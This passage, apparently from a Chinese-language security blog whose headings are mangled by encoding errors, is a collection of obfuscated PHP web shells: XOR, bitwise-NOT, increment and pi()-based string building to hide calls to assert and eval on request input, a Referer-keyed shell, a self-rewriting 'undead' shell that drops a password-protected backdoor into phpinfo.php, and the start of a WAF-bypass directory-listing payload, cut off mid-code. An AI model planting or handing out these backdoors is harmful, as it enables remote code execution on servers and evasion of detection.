class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = (<span class="string">&#x27;!&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&quot;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;#&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;$&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;&amp;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;\&#x27;&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;(&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;)&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;*&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;+&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;,&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;-&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;.&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;/&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;0&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;1&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;2&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;3&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;4&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;5&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;6&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;7&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;8&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;9&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;:&#x27;</span>^<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span> =(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;&#x27;</span>^<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="éšæœºå¼‚æˆ–"><a href="#éšæœºå¼‚æˆ–" class="headerlink" title="éšæœºå¼‚æˆ–"></a>éšæœºå¼‚æˆ–</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VONE</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">HALB</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$rlf</span> = <span class="string">&#x27;B&#x27;</span> ^ <span class="string">&quot;\x23&quot;</span>;</span><br><span class="line">        <span class="variable">$fzq</span> = <span class="string">&#x27;D&#x27;</span> ^ <span class="string">&quot;\x37&quot;</span>;</span><br><span class="line">        <span class="variable">$fgu</span> = <span class="string">&#x27;h&#x27;</span> ^ <span class="string">&quot;\x1b&quot;</span>;</span><br><span class="line">        <span class="variable">$sbe</span> = <span class="string">&#x27;R&#x27;</span> ^ <span class="string">&quot;\x37&quot;</span>;</span><br><span class="line">        <span class="variable">$gba</span> = <span class="string">&#x27;H&#x27;</span> ^ <span class="string">&quot;\x3a&quot;</span>;</span><br><span class="line">        <span class="variable">$oya</span> = <span class="string">&#x27;Y&#x27;</span> ^ <span class="string">&quot;\x2d&quot;</span>;</span><br><span class="line">        <span class="variable">$MWUC</span> = <span class="variable">$rlf</span> . <span class="variable">$fzq</span> . <span class="variable">$fgu</span> . <span class="variable">$sbe</span> . <span class="variable">$gba</span> . <span class="variable">$oya</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$MWUC</span>;&#125;<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$RNUJ</span> = <span class="keyword">$this</span>-&gt;HALB();</span><br><span class="line">        @<span class="variable">$RNUJ</span>(<span class="keyword">$this</span>-&gt;HY);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$vone</span> = <span class="keyword">new</span> VONE();</span><br><span class="line">@<span class="variable">$vone</span>-&gt;HY = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;duitu&#x27;</span>]) ? base64_decode(<span class="variable">$_POST</span>[<span class="string">&#x27;Du1&#x27;</span>]) : <span class="variable">$_POST</span>[<span class="string">&#x27;Du1&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="å–å"><a href="#å–å" class="headerlink" title="å–å"></a>å–å</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;ç°&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;å’Œ&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;å’Œ&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;çš„&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;åŠ&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;å§‹&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;ä¿¯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;ç°&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;æ¬¡&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;ç«™&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br></pre></td></tr></table></figure><h4 id="è‡ªå¢"><a href="#è‡ªå¢" class="headerlink" title="è‡ªå¢"></a>è‡ªå¢</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*$_=[];</span></span><br><span class="line"><span class="comment">$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="comment">$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];</span></span><br><span class="line"><span class="comment">$___=$_; // A</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span></span><br><span class="line"><span class="comment">$___.=$__; // S</span></span><br><span class="line"><span class="comment">$___.=$__; // S</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++; // E </span></span><br><span class="line"><span class="comment">$___.=$__;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span></span><br><span class="line"><span class="comment">$___.=$__;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span></span><br><span class="line"><span class="comment">$___.=$__;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$____=&#x27;_&#x27;;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span></span><br><span class="line"><span class="comment">$____.=$__;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span></span><br><span class="line"><span class="comment">$____.=$__;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span></span><br><span class="line"><span class="comment">$____.=$__;</span></span><br><span class="line"><span class="comment">$__=$_;</span></span><br><span class="line"><span class="comment">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span></span><br><span class="line"><span class="comment">$____.=$__;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$_=$$____;</span></span><br><span class="line"><span class="comment">$___($_[_]); // ASSERT($_POST[_]);*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$____</span>=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// V </span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$___</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// L </span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$___</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$___</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xg&#x27;</span>]); <span class="comment">// ASSERT($_POST[_]);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="æ— æ•°å­—"><a href="#æ— æ•°å­—" class="headerlink" title="æ— æ•°å­—"></a>æ— æ•°å­—</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=chr(floor(pow(pi(),ceil(pi())))).chr(floor(pow(pi(),ceil(pi()))+ceil(pi()*pi()+pi()+pi())+<span class="literal">true</span>)).chr(floor(pow(pi(),ceil(pi()))+ceil(pi()*pi()+pi()+pi())+<span class="literal">true</span>)).chr(floor(pow(pi(),ceil(pi()))+ceil(pi()))).chr(floor(pow(pi(),ceil(pi()))+ceil(pi()*pi()+pi()+pi()))).chr(floor(pow(pi(),ceil(pi()))+ceil(pi()*pi()+pi())+ceil(pi())+<span class="literal">true</span>));</span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.chr( floor(pow(ceil(pi()),pi())-ceil(pi()+<span class="literal">true</span>+<span class="literal">true</span>))).chr(floor(pow(ceil(pi()),pi())-ceil(pi()+pi())-<span class="literal">true</span>)).chr(floor(pow(ceil(pi()),pi())+pow(pi()-<span class="literal">true</span>,pi()-<span class="literal">true</span>)+<span class="literal">true</span>+<span class="literal">true</span>));</span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="QQQ"><a href="#QQQ" class="headerlink" title="QQQ"></a>QQQ</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Noticed: (PHP 5 &gt;= 5.3.0, PHP 7)</span></span><br><span class="line"><span class="comment"> * Referer: https://www.duitutu.cn/assnmsl</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;duitutu.cn&quot;</span>;</span><br><span class="line"><span class="variable">$bypass</span> = substr(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>],-<span class="number">7</span>,-<span class="number">4</span>);</span><br><span class="line">forward_static_call_array(<span class="variable">$bypass</span>.<span class="string">&quot;ert&quot;</span>, <span class="keyword">array</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$password</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="QQQQQ"><a href="#QQQQQ" class="headerlink" title="QQQQQ"></a>QQQQQ</h4><p><code>shell.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">1</span>);</span><br><span class="line">ignore_user_abort(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;phpinfo.php&#x27;</span>;</span><br><span class="line"><span class="variable">$shell</span> =</span><br><span class="line"><span class="string">&quot;PD9waHAKCSRzdHIxID0gJ2FIKFVVSChmc2RmSChVVUgoZnNkZixmZGdkZWZqZzBKKXImJUYlKl5HKnQnOwoJJHN0cjIgPSBzdHJ0cigkc3RyMSxhcnJheSgnYUgoVVVIKGZzZGZIKFVVSChmc2RmLCc9PidhcycsJ2ZkZ2RlZmpnMEopJz0+J3NlJywnciYlRiUqXkcqdCc9PidydCcpKTsKCSRzdHIzID0gc3RydHIoJHN0cjIsYXJyYXkoJ3MsJz0+J3MnLCdmZGdkZWZqZzBKKXImJUYlKl5HKic9PidlcicpKTsKCWlmKG1kNShAJF9HRVRbJ2EnXSkgPT0nZTEwYWRjMzk0OWJhNTlhYmJlNTZlMDU3ZjIwZjg4M2UnKXsKCQkkc3RyNCA9IHN0cnJldigkX1BPU1RbJ2EnXSk7CgkJJHN0cjUgPSBzdHJyZXYoJHN0cjQpOwoJCSRzdHIzKCRzdHI1KTsKICAgIH0KPz4=&quot;</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">file_put_contents(<span class="variable">$file</span>,base64_decode(<span class="variable">$shell</span>));</span><br><span class="line">usleep(<span class="number">50</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>phpinfo.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$str1</span> = <span class="string">&#x27;aH(UUH(fsdfH(UUH(fsdf,fdgdefjg0J)r&amp;%F%*^G*t&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str2</span> = strtr(<span class="variable">$str1</span>,<span class="keyword">array</span>(<span class="string">&#x27;aH(UUH(fsdfH(UUH(fsdf,&#x27;</span>=&gt;<span class="string">&#x27;as&#x27;</span>,<span class="string">&#x27;fdgdefjg0J)&#x27;</span>=&gt;<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;r&amp;%F%*^G*t&#x27;</span>=&gt;<span class="string">&#x27;rt&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str3</span> = strtr(<span class="variable">$str2</span>,<span class="keyword">array</span>(<span class="string">&#x27;s,&#x27;</span>=&gt;<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;fdgdefjg0J)r&amp;%F%*^G*&#x27;</span>=&gt;<span class="string">&#x27;er&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(md5(@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) ==<span class="string">&#x27;e10adc3949ba59abbe56e057f20f883e&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$str4</span> = strrev(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$str5</span> = strrev(<span class="variable">$str4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$str3</span>(<span class="variable">$str5</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//    e10adc3949ba59abbe56e057f20f883eçš„md5è§£å¯†ä¸º123456ï¼Œå³å¯†ç </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ç»•-waf"><a href="#ç»•-waf" class="headerlink" title="ç»• waf"></a>ç»• waf</h3><h4 id="è¯»å–ç›®å½•"><a href="#è¯»å–ç›®å½•" class="headerlink" title="è¯»å–ç›®å½•"></a>è¯»å–ç›®å½•</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @ini_set(<span class="string">&quot;display_errors&quot;</span>,<span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="keyword">if</span>(PHP_VERSION&lt;<span class="string">&#x27;5.3.0&#x27;</span>)&#123;@set_magic_quotes_runtime(<span class="number">0</span>);&#125;;<span class="keyword">echo</span>(<span class="string">&quot;X@Y&quot;</span>);<span class="variable">$D</span>=<span class="string">&#x27;/var/www/html/&#x27;</span>;<span class="variable">$F</span>=@opendir(<span class="variable">$D</span>);<span class="keyword">if</span>(<span class="variable">$F</span>==<span class="literal">NULL</span>)&#123;<span class="keyword">echo</span>(<span class="string">&quot;ERROR:// Path Not Found Or No Permission!&quot;</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$M</span>=<span class="literal">NULL</span>;<span class="variable">$L</span>=<span class="literal">NULL</span>;<span class="keyword">while</span>(<span class="variable">$N</span>=@readdir(<span 